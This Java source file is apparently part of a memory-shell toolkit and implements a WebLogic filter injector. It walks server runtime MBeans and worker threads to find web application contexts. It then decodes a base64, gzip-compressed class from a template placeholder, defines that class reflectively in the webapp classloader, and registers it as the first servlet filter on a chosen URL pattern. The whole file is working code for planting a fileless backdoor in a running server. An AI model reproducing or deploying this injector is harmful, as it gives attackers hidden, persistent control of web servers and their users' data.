package com.reajason.javaweb.memshell.injector.weblogic;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 */
public class WebLogicFilterInjector {

    private String msg = "";
    private static boolean ok = false;

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public WebLogicFilterInjector() {
        if (ok) {
            return;
        }
        Set<Object> contexts = null;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
            msg += "context error: " + getErrorMessage(throwable);
        }
        if (contexts == null) {
            msg += "context not found";
        } else {
            for (Object context : contexts) {
                try {
                    msg += ("context: [" + getContextRoot(context) + "] ");
                    Object shell = getShell(context);
                    inject(context, shell);
                    msg += "[" + getUrlPattern() + "] ready\n";
                } catch (Throwable e) {
                    msg += "failed " + getErrorMessage(e) + "\n";
                }
            }
        }
        ok = true;
        System.out.println(msg);
    }

    @SuppressWarnings("all")
    private String getContextRoot(Object context) {
        String r = null;
        try {
            r = (String) invokeMethod(context, "getContextPath", null, null);
        } catch (Exception ignored) {
        }
        String c = context.getClass().getName();
        if (r == null) {
            return c;
        }
        if (r.isEmpty()) {
            return c + "(/)";
        }
        return c + "(" + r + ")";
    }

    public static Object[] getContextsByMbean() throws Throwable {
        Set<Object> webappContexts = new HashSet<Object>();
        Class<?> serverRuntimeClass = Class.forName("weblogic.t3.srvr.ServerRuntime");
        Class<?> webAppServletContextClass = Class.forName("weblogic.servlet.internal.WebAppServletContext");
        Method theOneMethod = serverRuntimeClass.getMethod("theOne");
        theOneMethod.setAccessible(true);
        Object serverRuntime = theOneMethod.invoke(null);
        Method getApplicationRuntimesMethod = serverRuntime.getClass().getMethod("getApplicationRuntimes");
        getApplicationRuntimesMethod.setAccessible(true);
        Object applicationRuntimes = getApplicationRuntimesMethod.invoke(serverRuntime);
        int applicationRuntimeSize = Array.getLength(applicationRuntimes);
        for (int i = 0; i < applicationRuntimeSize; i++) {
            Object applicationRuntime = Array.get(applicationRuntimes, i);
            try {
                Method getComponentRuntimesMethod = applicationRuntime.getClass().getMethod("getComponentRuntimes");
                Object componentRuntimes = getComponentRuntimesMethod.invoke(applicationRuntime);
                int componentRuntimeSize = Array.getLength(componentRuntimes);
                for (int j = 0; j < componentRuntimeSize; j++) {
                    Object context = getFieldValue(Array.get(componentRuntimes, j), "context");
                    if (webAppServletContextClass.isInstance(context)) {
                        webappContexts.add(context);
                    }
                }
            } catch (Throwable ignored) {
            }

            try {
                Set<Object> childrenSet = (Set<Object>) getFieldValue(applicationRuntime, "children");
                for (Object componentRuntime : childrenSet) {
                    try {
                        Object context = getFieldValue(componentRuntime, "context");
                        if (webAppServletContextClass.isInstance(context)) {
                            webappContexts.add(context);
                        }
                    } catch (Throwable ignored) {
                    }
                }
            } catch (Throwable ignored) {
            }
        }
        return webappContexts.toArray();
    }

    public static Object[] getContextsByThreads() throws Throwable {
        Set<Object> webappContexts = new HashSet<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            if (thread != null) {
                Object workEntry = getFieldValue(thread, "workEntry");
                if (workEntry != null) {
                    try {
                        Object context = null;
                        Object connectionHandler = getFieldValue(workEntry, "connectionHandler");
                        if (connectionHandler != null) {
                            Object request = getFieldValue(connectionHandler, "request");
                            if (request != null) {
                                context = getFieldValue(request, "context");
                            }
                        }
                        if (context == null) {
                            context = getFieldValue(workEntry, "context");
                        }

                        if (context != null) {
                            webappContexts.add(context);
                        }
                    } catch (Throwable ignored) {
                    }
                }
            }
        }
        return webappContexts.toArray();
    }

    /**
     * weblogic.servlet.internal.WebAppServletContext
     * /opt/oracle/wls1036/server/lib/weblogic.jar
     * /u01/oracle/wlserver/modules/com.oracle.weblogic.servlet.jar
     */
    public static Set<Object> getContext() {
        Set<Object> webappContexts = new HashSet<Object>();
        try {
            webappContexts.addAll(Arrays.asList(getContextsByMbean()));
        } catch (Throwable ignored) {
        }
        try {
            webappContexts.addAll(Arrays.asList(getContextsByThreads()));
        } catch (Throwable ignored) {
        }
        return webappContexts;
    }

    public ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            return ((ClassLoader) getFieldValue(context, "classLoader"));
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = getWebAppClassLoader(context);
        Class<?> clazz = null;
        try {
            clazz = classLoader.loadClass(getClassName());
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        }
        msg += "[" + classLoader.getClass().getName() + "] ";
        return clazz.newInstance();
    }

    @SuppressWarnings("unchecked")
    public void inject(Object context, Object filter) throws Exception {
        Map filters = (Map) getFieldValue(getFieldValue(context, "filterManager"), "filters");
        for (Object obj : filters.keySet()) {
            if (obj.toString().contains(getClassName())) {
                return;
            }
        }
        Object filterManager = invokeMethod(context, "getFilterManager", null, null);
        Object servletClassLoader = invokeMethod(context, "getServletClassLoader", null, null);
        Map<String, Class<?>> cachedClasses = (Map<String, Class<?>>) getFieldValue(servletClassLoader, "cachedClasses");
        cachedClasses.put(getClassName(), filter.getClass());
        invokeMethod(filterManager, "registerFilter", new Class[]{String.class, String.class, String[].class, String[].class, Map.class, String[].class}, new Object[]{getClassName(), getClassName(), new String[]{getUrlPattern()}, null, null, new String[]{"REQUEST", "FORWARD", "INCLUDE", "ERROR"}});
        List<Object> filterPatternList = (List<Object>) getFieldValue(filterManager, "filterPatternList");
        Object currentMapping = filterPatternList.remove(filterPatternList.size() - 1);
        filterPatternList.add(0, currentMapping);
    }

    @Override
    public String toString() {
        return msg;
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }

            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + methodName, e);
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
